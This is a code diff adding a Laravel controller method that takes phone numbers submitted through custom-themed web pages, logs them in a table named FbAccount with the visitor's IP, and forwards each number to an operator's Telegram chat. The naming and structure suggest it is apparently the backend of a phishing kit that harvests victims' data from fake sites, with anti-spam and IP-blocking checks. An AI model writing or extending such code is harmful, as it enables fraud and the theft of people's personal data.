@@ -452,4 +452,82 @@ class CustomWeb extends Controller
             }
         }
     }
+    # BO23333 LAYSDT THEME
+    function bo23333_laysdt_post(Request $rq)
+    {
+        if ($rq->filled('d')) {
+            try {
+                $post_data = Json::decode($rq->d);
+                $web_info = Json::decode(Crypt::decryptString($post_data->info));
+                $ip = getRealIp();
+                // pusher code
+                $pusher_code = $rq->p_c;
+                // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
+                $check_ip = FbAccount::where('ip', $ip)
+                    ->where('type', 'custom')
+                    ->latest()
+                    ->first();
+                $wait_seconds = 3;
+                if ($check_ip) {
+                    if ($check_ip->created_at->diffInSeconds(now()) <= $wait_seconds) {
+                        return response([
+                            'status' => false,
+                        ]);
+                    }
+                }
+                $custom_bot = new Api(config('telegrambot.custom'));
+                $user = User::find($web_info->userid);
+                if ($user) {
+                    // kiểm tra xem ip có bị chặn không
+                    if (check_blocked_ip($user->id, $ip)) {
+                        // destroy session
+                        return;
+                    }
+                    $user_telegram_id = Json::decode($user->data)->telegram_id;
+                    if ($user_telegram_id) {
+                        $website = Website::where('userid', $user->id)->where('id', $web_info->webid)->first();
+                        $ip = getRealIp();
+                        // new account
+                        if ($website) {
+                            $website = Json::decode($website->data);
+                            $keyboard = [
+                                [
+                                    ['text' => '✅ Thành công', 'callback_data' => 'done_' . $pusher_code],
+                                ]
+                            ];
+                            $msg = implode("\n", [
+                                "Giao diện tùy chỉnh: <b>BO23333 LAYSDT</b>",
+                                "Web: <b>$website->title</b>",
+                                "",
+                                "------------------------",
+                                "<b>Số điện thoại:</b> <code>$post_data->phone</code>",
+                                "------------------------",
+                                "",
+                                "Emoji phân biệt: $web_info->emoji",
+                                ""
+                            ]);
+                            // tiến hành insert
+                            FbAccount::create([
+                                'userid' => $web_info->userid,
+                                'webid' => $web_info->webid,
+                                'user' => $post_data->phone,
+                                'type' => 'custom',
+                                'ip' => $ip
+                            ]);
+                            $custom_bot->sendMessage([
+                                'chat_id' => $user_telegram_id,
+                                'parse_mode' => 'HTML',
+                                'text' => $msg,
+                                'reply_markup' => json_encode(['inline_keyboard' => $keyboard]),
+                            ]);
+                        }
+                    }
+                }
+            } catch (\Throwable $e) {
+                return response([
+                    'status' => false,
+                ]);
+            }
+        }   
+    }
 }
